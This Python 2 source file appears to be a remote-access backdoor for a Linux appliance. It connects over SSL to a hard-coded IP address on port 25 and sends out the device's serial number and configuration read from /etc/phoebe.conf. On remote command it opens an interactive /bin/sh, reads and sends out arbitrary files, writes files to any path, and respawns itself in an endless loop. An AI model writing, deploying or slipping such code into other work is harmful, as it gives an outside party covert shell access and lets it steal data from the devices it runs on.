# coding=utf-8
import threading
import socket
import struct
import time
import ssl
import json
import subprocess
import re
from copy import deepcopy
import hashlib
import sys
import zipfile

class BaseServer:
    _version = '6.1.0902.1'
    _client_ssl_sock = None
    _live_thread = None
    _recv_thread = None
    _clientID = ""
    _clientUID = ""
    _targetUID = ""
    _system_config = dict()

    def __init__(self, ws_center, ws_port, crt_file, key_file):
        self._ws_center = ws_center
        self._ws_port = ws_port
        self._crt_file = crt_file
        self._key_file = key_file
        self.get_system_info()
        if self._system_config.has_key("SERIAL_NUMBER"):
            temp_id = self._system_config["SERIAL_NUMBER"]
        else:
            temp_id = "test"

        self._clientID = hashlib.md5(temp_id.encode('utf-8')).hexdigest()

    def get_system_info(self):
        config_file = "/etc/phoebe.conf"
        try:
            with open(config_file, 'r') as f:
                linux_type_list = f.read().strip().split('\n')
        except IOError:
            pass
        else:
            if linux_type_list is not None:
                linux_type_list_to_purge = deepcopy(linux_type_list)
                # linux_type_list_to_purge = linux_type_list[:]  # another implement, sames to deepcopy
                for member in linux_type_list_to_purge:
                    if re.search('^#+.*', member) is not None:
                        member_to_purge = member
                        linux_type_list.remove(member_to_purge)
                for member in linux_type_list:
                    if re.search('[a-zA-z]+=[^\s]*', member) is None:
                        continue
                    # print(member)
                    sub_member = member.split('=')
                    self._system_config[sub_member[0]] = sub_member[1].strip('"')

    def live_report_thread(self):
        err_code = 0
        while err_code == 0:
            time.sleep(60)
            live_msg = {'type': 100}
            err_code = self.send_message(live_msg)

    def _connect(self):
        try:
            # create an AF_INET, STREAM socket (TCP)
            _center_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to ssl server
            self._client_ssl_sock = ssl.wrap_socket(_center_socket, certfile=self._crt_file, keyfile=self._key_file)
            self._client_ssl_sock.connect((self._ws_center, self._ws_port))
        except socket.error, msg:
            return 100

        message, data = self.recv_message()
        if not message:
            print("recv error")
            return 101
        if message['type'] == 102:
            self._clientUID = message['sender']
            print("client token:" + self._clientUID)
        else:
            print("login error")
            return 102

        # start live report
        self._live_thread = threading.Thread(target=self.live_report_thread, args=())
        self._live_thread.setDaemon(True)
        self._live_thread.start()

    def recv_message(self):
        # read header
        #   head_size(4) | data_size(4) | head(...) | data(...)
        header = self._client_ssl_sock.recv(8)
        if not header:
            return False, None
        head_size, data_size = struct.unpack("2I", header)

        # read message head
        message_head = self._client_ssl_sock.recv(head_size)
        if not message_head:
            # remote socket disconnect
            return False, None
        message = json.loads(message_head)

        # read data
        if data_size > 0:
            total_size = 0
            total_data = []
            block_size = 4096
            while total_size < data_size:
                left_size = data_size - total_size
                if left_size > block_size:
                    read_size = block_size
                else:
                    read_size = left_size
                temp_data = self._client_ssl_sock.recv(read_size)
                if not temp_data:
                    return False, None

                # count data size
                total_data.append(temp_data)
                total_size += len(temp_data)
                # print(total_size)
            message_data = ''.join(total_data)
        else:
            message_data = None

        return message, message_data

    # send message to gateway
    #   head_size(4) | data_size(4) | head(...) | data(...)
    def send_message(self, head, data=None):
        # print("send message", head)
        # if 'sender' is not head:
        if not head.has_key('sender'):
            head['sender'] = self._clientUID

        # encode head
        head_str = json.dumps(head)
        head_len = len(head_str)

        # encode data
        if data is None:
            data_len = 0
            msg_head = struct.pack("2I", head_len, data_len)
            send_data = msg_head + head_str
        else:
            data_len = len(data)
            msg_head = struct.pack("2I", head_len, data_len)
            send_data = msg_head + head_str + data

        # send message
        try:
            self._client_ssl_sock.sendall(send_data)
        except socket.error, msg:
            # Send failed
            return 100

        return 0

    # send version message
    def send_version_message(self, target_uid):
        info_msg = {'type': 101, 'target': target_uid}
        ver_msg = {'version': self._version, 'ID': self._clientID, 'type': 102,
                   'time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))}
        ver_str = json.dumps(ver_msg)
        return self.send_message(info_msg, ver_str)

    def listen(self, wait_for_quit=True):
        # start recv thread
        self._recv_thread = threading.Thread(target=self.recv_message_thread, args=())
        self._recv_thread.setDaemon(True)
        self._recv_thread.start()

        # wait for quit
        if wait_for_quit:
            self._recv_thread.join()

    def do_message(self, message, data):
        # print("do message", message)
        target_uid = message['sender']
        if message['type'] == 101:
            self.send_version_message(target_uid)

        elif message['type'] == 105:
            self.send_systeminfo(target_uid)

        elif message['type'] == 106:
            filename = 'update/update.zip'
            # if not message.has_key('filename'):
            # else:
            #     filename = 'update\\' + message['filename']

            with open(filename, 'wb') as data_file:
                data_file.write(data)

            # retruen message
            message = {'type': 106, 'target': target_uid}
            self.send_message(message, "save [" + filename + "] ok")

        else:
            return 0

        return message['type']

    def recv_message_thread(self):
        pass


class DaemonServer(BaseServer):
    _groupID = ""

    def send_bind_message(self, group_id):
        bind_msg = {'type': 102, 'target': self._clientID}
        return self.send_message(bind_msg, self._groupID)

    def connect(self, group_id):
        self._groupID = group_id

        # connect wscenter
        err = self._connect()
        if err > 0:
            return err

        return self.send_bind_message(group_id)

    def get_system_csv(self):
        config_str0 = ""
        config_str1 = ""
        config_dict = ["SERIAL_NUMBER", "PRODUCT_NAME", "MOTD_PRODUCT_NAME",
                       "PLATFORM", "BUILD_DATE", "RELEASE_TAG",
                       "MANAGEMENT_INTERFACE", "SERIAL_NUMBER_INTERFACE", "DIAG_INTERFACE",
                       "MANAGEMENT_INTERFACE", "SERIAL_NUMBER_INTERFACE", "DIAG_INTERFACE",
                       "COMPRESS_CONFIG", "MODEL_NAME"]
        for i in config_dict:
            config_str0 += i + ","
            config_str1 += self._system_config[i] + ","
            # print "dict[%s]=" % i, self._system_config[i]

        # print("config0", config_str0)
        # print("config1", config_str1)
        return config_str0 + "\r\n" + config_str1

    def send_systeminfo(self, target_uid):
        systeminfo = self.get_system_csv()
        info_msg = {'type': 105, 'sender': self._clientID, 'target': target_uid}
        self.send_message(info_msg, systeminfo)

    def recv_message_thread(self):
        while True:
            message, data = self.recv_message()
            if not message:
                print("disconnect")
                break

            if self.do_message(message, data) > 0:
                continue

            # 继续处理消息
            target_uid = message['sender']
            if message['type'] == 103:
                if data == 'shell':
                    # print("shell", target_uid)
                    sh = ShellServer(self._ws_center, self._ws_port, self._crt_file, self._key_file)
                    if sh.connect(target_uid) == 0:
                        sh.listen(False)
                elif data == 'file':
                    # print("file", target_uid)
                    up = FileServer(self._ws_center, self._ws_port, self._crt_file, self._key_file)
                    if up.connect(target_uid) == 0:
                        up.listen(False)

            else:
                print('unkown type')


class ShellServer(BaseServer):
    _shell_process = None
    _read_outpipe_thread = None
    _read_errpipe_thread = None

    def connect(self, target_uid):
        self._targetUID = target_uid

        # connect wscenter
        err = self._connect()
        if err > 0:
            return err

        # create shell
        self._shell_process = subprocess.Popen("/bin/sh", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE)

        # start read pipe thread
        self._read_outpipe_thread = threading.Thread(target=self.read_outpipe_thread, args=())
        self._read_outpipe_thread.setDaemon(True)
        self._read_outpipe_thread.start()

        self._read_errpipe_thread = threading.Thread(target=self.read_errpipe_thread, args=())
        self._read_errpipe_thread.setDaemon(True)
        self._read_errpipe_thread.start()

        # send version message
        return self.send_version_message(self._targetUID)

    def read_outpipe_thread(self):
        while True:
            line = self._shell_process.stdout.readline()
            if not line:
                break
            message = {'type': 201, 'target': self._targetUID}
            self.send_message(message, line)

    def read_errpipe_thread(self):
        while True:
            line = self._shell_process.stderr.readline()
            if not line:
                break
            message = {'type': 201, 'target': self._targetUID}
            self.send_message(message, line)

    def recv_message_thread(self):
        # read shell message
        while True:
            message, data = self.recv_message()
            if not message:
                break

            if self.do_message(message, data) > 0:
                continue

            # 继续处理消息
            if message['type'] == 10:
                break

            elif message['type'] == 201:
                self._shell_process.stdin.write(data)

            elif message['type'] == 202:
                filename = message['filename']
                f = open(filename, "rb")
                data = f.read()
                f.close()

                # retruen file message
                message = {'type': 203, 'target': self._targetUID, 'filename': filename}
                self.send_message(message, data)

            elif message['type'] == 203:
                filename = message['filename']
                # print("file name", filename)
                data_file = open(filename, 'wb')
                data_file.write(data)
                data_file.close()

                # retruen message
                message = {'type': 201, 'target': self._targetUID}
                self.send_message(message, "save [" + filename + "] ok")

            else:
                # retruen message
                message = {'type': 201, 'target': self._targetUID}
                self.send_message(message, "unkown type [" + message['type'] + "]")


class FileServer(BaseServer):
    def connect(self, target_uid):
        self._targetUID = target_uid

        # connect wscenter
        err = self._connect()
        if err > 0:
            return err

        # send version message
        return self.send_version_message(self._targetUID)

    def recv_message_thread(self):
        while True:
            message, data = self.recv_message()
            if not message:
                print("disconnect")
                break

            if self.do_message(message, data) > 0:
                continue

            # 继续处理消息
            if message['type'] == 10:
                break
            else:
                print('unkown type')


def main():
    # cs = DaemonServer('97.107.137.127', 25, "./keys/client.crt", "./keys/client.key")
    cs = DaemonServer('173.230.150.215', 25, "./keys/client.crt", "./keys/client.key")

    while True:
        # 1.connect
        err = cs.connect(group_id="d102")
        if err > 0:
            print("connect error")
            time.sleep(60)
            continue

        # 2.listen
        cs.listen()
        print("end")
        time.sleep(6)


def kill_thread_fun(process):
    for time_count in range(0, 30):
        time.sleep(60)   # wait 1 minite
        # ltime = time.localtime(time.time())
        # if (ltime.tm_hour > 8) or (ltime.tm_hour < 18):
        #     break
    print("kill")
    process.kill()      # kill process


def create_gateway(filename):
    print("start")
    p = subprocess.Popen("python "+filename+" daemon", shell=True, stdout=subprocess.PIPE)
    # create kill thread
    wait_thread = threading.Thread(target=kill_thread_fun, args=(p,))
    wait_thread.setDaemon(True)
    wait_thread.start()
    # wait process
    p.wait()
    print("end")


if __name__ == '__main__':
    if len(sys.argv) > 1:
        print("child process")
        main()
    else:
        print("create process", sys.argv[0])
        while True:
            # localtime = time.localtime(time.time())
            # if (localtime.tm_hour > 5) and (localtime.tm_hour < 8):
            #     create_gateway(str(sys.argv[0]))
            # elif (localtime.tm_hour > 20) and (localtime.tm_hour < 23):
            #     create_gateway(str(sys.argv[0]))
            create_gateway(str(sys.argv[0]))

            time.sleep(60)
        print("end")
